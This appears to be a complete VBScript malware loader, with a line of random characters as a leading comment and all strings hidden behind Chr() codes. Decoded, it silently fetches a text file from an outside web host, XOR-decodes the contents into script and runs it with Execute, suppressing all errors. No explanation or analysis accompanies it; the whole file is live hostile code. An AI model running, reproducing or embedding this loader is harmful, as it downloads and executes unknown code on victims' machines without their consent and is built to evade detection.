' yEWJiEbLrpQXDccrrRCDeztCPEpRafYKyvZIFkESOKfXItJvqZTzQFLuTaBqjbsAzsrtwAVayiKLLsRpyltEdldLVdLqhFPILZTYJQEZeaYBSlEzpvRBREfIXlKnNUQqjQwG
On Error Resume Next
Dim L,V,A,y
Set L=CreateObject((Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)))
L.Open (Chr(71)&Chr(69)&Chr(84)),(Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(115)&Chr(116)&Chr(111)&Chr(112)&Chr(108)&Chr(97)&Chr(103)&Chr(46)&Chr(111)&Chr(114)&Chr(103))&(Chr(47)&Chr(115)&Chr(50)&Chr(46)&Chr(116)&Chr(120)&Chr(116)),False
L.Send
If L.Status=200 Then
  V=Split(L.ResponseText,(Chr(44)))
  A=""
  For y=0 To UBound(V)
    A=A&Chr(CInt(V(y)) Xor 137)
  Next
  Execute A
End If
Set L=Nothing
